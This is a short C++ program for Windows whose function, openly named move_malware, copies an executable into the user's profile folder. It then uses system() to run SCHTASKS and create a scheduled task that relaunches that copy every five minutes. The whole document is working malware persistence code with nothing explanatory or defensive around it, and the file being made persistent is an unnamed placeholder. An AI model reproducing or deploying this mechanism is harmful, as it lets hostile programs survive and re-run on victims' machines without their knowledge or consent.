#include <iostream>
#include <windows.h>


int move_malware() {
    const char* sourceFileName = "helloworld.exe";
    const char* destinationFolderPath = getenv("USERPROFILE");

    if (destinationFolderPath == nullptr) {
        std::cerr << "Failed to get the user's profile folder path." << std::endl;
        return 1;
    }

    std::string destinationFilePath = destinationFolderPath;
    destinationFilePath += "\\";
    destinationFilePath += sourceFileName;

    if (!CopyFileA(sourceFileName, destinationFilePath.c_str(), FALSE)) {
        std::cerr << "Failed to copy the file: " << GetLastError() << std::endl;
        return 1;
    }

    std::cout << "File copied successfully to: " << destinationFilePath << std::endl;

    return 0;
}


int main() {
if (move_malware() != 0) {
        return 1;
    }
    const char* destinationFolderPath = getenv("USERPROFILE");
    const char* exePath = "helloworld.exe";
    char command[512];
    snprintf(command, sizeof(command), "SCHTASKS /Create /SC MINUTE /MO 5 /TN HelloWorldTask /TR \"%s\\%s\"", destinationFolderPath, exePath);
    
    int result = system(command);

    if (result != 0) {
        return 1;
    }

    return 0;
}
